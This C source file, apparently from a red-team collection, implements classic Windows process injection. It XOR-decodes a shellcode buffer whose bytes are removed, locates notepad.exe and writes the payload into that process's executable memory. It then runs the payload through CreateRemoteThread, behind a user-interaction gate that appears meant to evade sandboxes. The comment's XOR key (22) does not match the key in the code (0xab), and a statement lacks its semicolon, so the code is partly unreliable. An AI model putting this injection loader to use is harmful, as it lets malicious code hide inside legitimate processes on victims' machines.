// Inspired from: https://www.ired.team/offensive-security/code-injection-process-injection/process-injection

#include "stdio.h"
#include "Windows.h"
#include "..\functions.h"

int main(int argc, char* argv[])
{
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	DWORD pid;

	/* length: 927 bytes */
	//unsigned char buf[] = "<removed>";

	// Shellcode encrypted with XOR (key=22)
	unsigned char buf[] = "<removed>"

	int ret = insert_user_interaction();

	if (ret == 1) {
		// Decrypt shellcode
		for (int x = 0; x < 927; x++) {
			*((char*)buf + x) = *((char*)buf + x) ^ '\xab';
		}

		// Resolve pid from name
		pid = FindProcessId(L"notepad.exe");
		//pid = FindProcessId(L"jusched.exe");	// Not working: spawn werfault and exit
		//pid = FindProcessId(L"OneDrive.exe");	// Not working: spawn werfault and exit
		//pid = FindProcessId(L"explorer.exe");

		if (pid == 0) {
			printf("Could not find process. Have you started notepad.exe?\n");
			return 1;
		}

		// Get handle to process
		printf("Injecting to PID: %i", pid);
		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

		// Inject
		remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(processHandle, remoteBuffer, buf, sizeof buf, NULL);
		remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

		CloseHandle(processHandle);
	}

	return 0;
}
